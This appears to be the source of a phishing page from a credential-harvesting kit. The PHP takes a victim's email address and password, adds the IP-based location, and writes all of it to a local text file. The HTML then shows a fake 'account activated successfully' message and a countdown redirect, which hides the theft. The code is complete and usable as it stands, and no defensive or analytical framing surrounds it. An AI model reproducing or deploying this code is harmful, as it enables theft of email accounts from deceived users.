<?php
ini_set("display_errors", 0);

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];

if (isset($_POST['bclv'])){

 
	
	$file = fopen("funca.txt", "a");
fwrite($file, "||====================" . PHP_EOL);
fwrite($file, "|| C0rr30 : ".$_GET['correo']." - CL4V3 C0RR30: ".$_POST['bclv']." - IP: ".$myip." ".$pais." ".$region." ".date('d/m/Y') .PHP_EOL);
fwrite($file, "||====================" . PHP_EOL);
fclose($file);
}

?>
<!DOCTYPE html>
<html>
<head>
	<title>servicios</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="https://ik.imagekit.io/eruobiiei/main.css">
   	 <script type="text/javascript">
						   var tiempo=5;
						   var url="Cuenta Confirmada con exito.com";
					 
						function updateReloj()
						{
							document.getElementById('contador').innerHTML = " ";
					 
							if(tiempo==0)
							{
								window.location=url;
																			
							}else{
								tiempo-=1;
								setTimeout("updateReloj()",1000);
							}
						}
					   window.onload=updateReloj;
   </script> 
</head>
<body>
<div id="vista1">	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form method="post" action="" class="delform" >
	
					<img src="https://ik.imagekit.io/eruobiiei/modolais.png" style="width:120px;"><br><br>
					<div class="ms-StackItem css-102"><span class="css-103"></span></div><br>
						<span style=" font-family: Helvetica  ;
    -webkit-font-smoothing: antialiased;
    font-size: 30px;
    font-weight: 600;
    color: rgb(27, 26, 25);
    display: inline;
    line-height: 32px;"><b>¡Ha activado su cuenta exitosamente!</b></span><br>
	
	<div align="center"><img src="https://ik.imagekit.io/eruobiiei/logolaismodo.png" style="align-self: center; height: 128px; width: 128px;"></div><br>
						
				<div align="center">
				<span style="font-size: 14px; font-family:Helvetica;">
				<font id="contador" style=""></font></span></div><br>

				
					<br><br>

					
					

					<div class="container-login100-form-btn">
						
					</div>


				
				
				</form>
			</div>
			
		</div>
	</div>
</div>


</body>
</html>